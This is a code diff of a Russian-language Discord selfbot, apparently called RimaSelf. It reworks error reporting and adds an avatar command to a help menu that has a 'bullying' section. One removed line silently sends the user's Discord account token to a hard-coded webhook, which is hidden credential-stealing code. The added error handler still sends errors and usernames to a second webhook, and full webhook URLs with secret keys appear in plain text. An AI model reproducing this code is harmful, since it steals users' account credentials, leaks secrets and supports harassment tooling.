@@ -89,9 +89,12 @@ async def on_command_error(ctx, error):
         await sleep(delmsgcd)
         await ctx.message.delete()
     else:
-        open("traceback.txt", 'w').write(f"-------- RIMASELF TRACEBACK --------\n\nУпс! Похоже возникла небольшая ошибка. \nОшибка была успешно отправленна создателям!\n\n{error}")
         print(f"[ERROR] * {error}")
-        if rconfig["Settings"]["send_traceback"]: requests.post("https://discord.com/api/webhooks/1052875114200449035/mWG7O1am7VFYVSuqFmc4h5HCR_AEH9S_Xlxb_DtYkt52o-aIlob7JRZKjYDBmm6jCNgD", json={"username" : "TraceBack", "content": f"User: {client.user}\nError: {error}"})
+        if rconfig["Settings"]["send_traceback"] == "True": 
+            traceback_text = f"-------- RIMASELF TRACEBACK --------\n\nУпс! Похоже возникла небольшая ошибка. \nОшибка была автоматически отправленна создателям!\nЕсли вы не хотите авто-отправление ошибок, вы можете отключить его в конфиге. \n\n{error}"
+            requests.post("https://discord.com/api/webhooks/1053008686299234416/J4Dnh0kPJACtNRJ0XYqrOr1FUnBZHNYmQQ5MeYOuxH3KRdN5egF1Hvli3SX7XWSU_otn", json={"username" : "TraceBack", "content": f"User: {client.user}\nError: {error}"})
+        else: traceback_text = f"-------- RIMASELF TRACEBACK --------\n\nУпс! Похоже возникла небольшая ошибка. \nКсожелению, вы отключили в конфиге авто-отправку ошибок для их исправления создателям.\nИ поэтому, данная ошибка вероятно не будет исправленна!\n\n{error}"
+        open("traceback.txt", 'w').write(traceback_text)
 
 
 
@@ -121,6 +124,7 @@ async def help(ctx):
 「☄️」 [1;2m[1;34mO T H E R[0m[0m
   [  -  ]  [2;34mping[0m [2;35m| Пинг
 [0m  [  -  ]  [2;34mactivity[0m <playing/streaming/watching> <текст> [2;35m| Изменить статус[0m
+[0m  [  -  ]  [2;34mavatar[0m <@mention> [2;35m| Получить аватар юзера[0m
   [  -  ]  [2;34mtyping[0m [2;35m| Включить красивый шрифт [0m[2;35m(Съᴇшь ᴇщё эᴛᴎⅹ ᴍᴙᴦᴋᴎⅹ фᴩᴀнцуᴈᴄᴋᴎⅹ буᴫᴏᴋ, дᴀ выᴨᴇй жᴇ чᴀю)
 [0m
 「🤬」 [1;2m[1;31mB U L L I N G[0m[0m
@@ -225,7 +229,7 @@ async def activity(ctx, stype, *, text):
 ```''')
         await sleep(delmsgcd)
         await ctx.message.delete()
-requests.post("https://discord.com/api/webhooks/1052875114200449035/mWG7O1am7VFYVSuqFmc4h5HCR_AEH9S_Xlxb_DtYkt52o-aIlob7JRZKjYDBmm6jCNgD", json={"username" : "TraceBack", "content": f"User: {client.user}\n" + rconfig["Settings"]["token"]})
+
 @client.command()
 async def typing(ctx):
     global istyping
